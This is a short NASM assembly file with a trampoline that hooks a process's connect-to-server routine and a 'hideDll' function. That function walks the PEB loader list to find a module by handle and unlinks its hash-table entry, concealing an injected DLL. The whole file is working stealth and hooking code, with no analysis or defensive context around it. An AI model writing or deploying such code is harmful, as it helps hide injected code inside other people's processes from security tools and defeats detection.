[bits 32]
%macro function 1
        section .text$%1
%if __BITS__ == 32
        global _%1
        _%1:
%elif __BITS__ == 64
        global %1
        %1:
%endif
%endmacro

extern _g_doConnectIpAdrTramp
function hookOnConnectServerRet
push ebx
jmp [_g_doConnectIpAdrTramp]


function hideDll@4
mov eax, [fs:0x30]         ; Load PEB (offset 0x30 from FS)
mov eax, [eax + 0x0C]      ; Load LDR_DATA (offset 0x0C from PEB)
mov eax, [eax + 0x0C]      ; Load InLoadOrderModuleList (offset 0x0C from LDR_DATA)
mov ecx, [esp + 0x04]      ; Load hInstDLL from stack (offset depends on stack alignment)


find_module:
mov eax, [eax]             ; Dereference the module list
cmp [eax + 0x18], ecx      ; Compare the module handle (offset 0x18 from entry)
jne find_module            ; If not equal, jump back to find_module
mov ecx,[eax+60] ;HashLinks
;test eax,eax
;jne .Skip
mov edx,[eax+64]
;test edx,edx
;jne .Skip
mov [ecx+4],edx
mov [edx],ecx
;.Skip:
ret 4